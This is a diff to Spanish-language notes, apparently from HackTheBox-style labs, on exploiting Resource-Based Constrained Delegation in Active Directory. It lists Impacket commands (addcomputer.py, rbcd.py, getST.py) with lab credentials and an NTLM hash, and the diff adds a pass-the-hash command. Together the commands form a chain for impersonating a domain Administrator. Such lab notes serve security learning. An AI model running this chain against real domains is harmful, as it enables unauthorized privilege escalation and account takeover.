@@ -40,6 +40,7 @@ Para identificar si RBCD puede ser explotado en un entorno Active Directory, nec
 ## Pasos de explotación
 - `addcomputer.py -dc-ip 10.10.11.174 support.htb/support:Ironside47pleasure40Watchful -computer-name attackersystem -computer-pass Summer2018!`
     - Utilizamos addcomputer.py para crear una computadora en el dominio con el usuario que identificamos como vulnerable.
+- `addcomputer.py 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'COMPUTER$' -computer-pass 'SomePassword' -dc-host RESOURCEDC.RESOURCED.LOCAL -domain-netbios resourced`
 - `rbcd.py -dc-ip 10.10.11.174 -action write -delegate-to DC$ -delegate-from attackersystem$ support.htb/support:Ironside47pleasure40Watchful`
     - Usamos rbcd.py para modificar el atributo msDS-AllowedToActOnBehalfOfOtherIdentity de DC$ y permitir que attackersystem$ delegue.
 - `getST.py -dc-ip 10.10.11.174 -spn host/DC.SUPPORT.HTB -impersonate Administrator support.htb/attackersystem$:Summer2018!`
